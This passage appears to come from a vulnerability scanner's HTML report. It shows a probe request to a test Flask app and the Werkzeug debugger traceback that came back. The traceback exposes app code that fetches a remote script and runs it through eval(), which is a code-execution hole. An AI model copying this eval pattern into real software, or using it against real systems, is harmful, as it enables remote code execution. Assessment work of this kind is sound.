+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;@app.route(&amp;#39;/app&amp;#39;)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def home():&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;api = requests.get(&amp;#39;http://nginx/api/get&amp;#39;).text&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;script = requests.get(api).text&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;eval_result = eval(json.loads(script)[&amp;#34;script&amp;#34;])  # Be cautious with eval due to security risks&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;name = requests.get(&amp;#39;http://nginx/name/get&amp;#39;).text&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;#eval_result = api_script&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273528960&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/api.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;73&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;get&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;:param \*\*kwargs: Optional arguments that ``request`` takes.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;:return: :class:`Response &amp;lt;Response&amp;gt;` object&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;:rtype: requests.Response&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;return request(&amp;#34;get&amp;#34;, url, params=params, **kwargs)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def options(url, **kwargs):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;r&amp;#34;&amp;#34;&amp;#34;Sends an OPTIONS request.&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273529184&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/api.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;59&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;# By using the &amp;#39;with&amp;#39; statement we are sure the session is closed, thus we&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;# avoid leaving sockets open which can trigger a ResourceWarning in some&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;# cases, and look like a memory leak in others.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;with sessions.Session() as session:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return session.request(method=method, url=url, **kwargs)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def get(url, params=None, **kwargs):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;r&amp;#34;&amp;#34;&amp;#34;Sends a GET request.&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273529408&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/sessions.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;575&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;params=params or {},&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;auth=auth,&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;cookies=cookies,&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;hooks=hooks,&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;)&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;prep = self.prepare_request(req)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;proxies = proxies or {}&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;settings = self.merge_environment_settings(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;prep.url, proxies, stream, verify, cert&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273529520&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/sessions.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;484&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;prepare_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;auth = request.auth&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if self.trust_env and not auth and not self.auth:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;auth = get_netrc_auth(request.url)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;p = PreparedRequest()&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;p.prepare(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;method=request.method.upper(),&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;url=request.url,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;files=request.files,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;data=request.data,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;json=request.json,&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273529632&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/models.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;367&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;prepare&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;json=None,&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;):&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Prepares the entire request with the given parameters.&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_method(method)&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_url(url, params)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_headers(headers)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_cookies(cookies)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_body(data, files, json)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_auth(auth, url)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562273087152&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/models.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;438&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;prepare_url&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;scheme, auth, host, port, path,</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz2zzvz-71</code> — <code>artifacts/s-0009/ev-mqz2zzvz-71/</code></div><div class="lbl">REQUEST</div><pre>GET /app?url=http://example.com HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE (truncated)</div><pre>HTTP/1.1 500
+connection: keep-alive
+content-length: 22325
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 10:35:05 GMT
+server: nginx/1.31.2
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+  &lt;head&gt;
+    &lt;title&gt;requests.exceptions.MissingSchema: Invalid URL &amp;#39;canary&amp;#39;: No scheme supplied. Perhaps you meant https://canary?
+ // Werkzeug Debugger&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot;
+        href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png&quot;&gt;
+    &lt;script src=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+      var CONSOLE_MODE = false,
+          EVALEX = false,
+          EVALEX_TRUSTED = false,
+          SECRET = &quot;***REDACTED***&quot;;
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color: #fff&quot;&gt;
+    &lt;div class=&quot;debugger&quot;&gt;
+&lt;h1&gt;MissingSchema&lt;/h1&gt;
+&lt;div class=&quot;detail&quot;&gt;
+  &lt;p class=&quot;errormsg&quot;&gt;requests.exceptions.MissingSchema: Invalid URL &amp;#39;canary&amp;#39;: No scheme supplied. Perhaps you meant https://canary?
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 class=&quot;traceback&quot;&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
+&lt;div class=&quot;traceback&quot;&gt;
+  &lt;h3&gt;&lt;/h3&gt;
+  &lt;ul&gt;&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272435440&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1498&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__call__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;) -&amp;gt; cabc.Iterable[bytes]:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;The WSGI server calls the Flask application object as the&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;WSGI application. This calls :meth:`wsgi_app`, which can be&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;wrapped to apply middleware.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.wsgi_app(environ, start_response)&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272435216&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1476&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;raise&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return response(environ, start_response)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;finally:&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272433648&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1473&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;ctx = self.request_context(environ)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error: BaseException | None = None&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272435328&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;882&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;rv: ft.ResponseReturnValue | HTTPException,&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272435776&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;880&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272435888&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;865&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;and req.method == &amp;#34;OPTIONS&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;):&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return self.make_default_options_response()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# otherwise dispatch to the handler for that endpoint&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def full_dispatch_request(self) -&amp;gt; Response:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Dispatches the request and on top of that performs request&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;pre and postprocessing as well as HTTP exception catching and&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error handling.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272436000&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/app/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;10&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;home&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source &quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;app = Flask(__name__)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;@app.route(&amp;#39;/app&amp;#39;)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def home():&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;api = requests.get(&amp;#39;http://nginx/api/get&amp;#39;).text&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;script = requests.get(api).text&lt;/pre&gt;
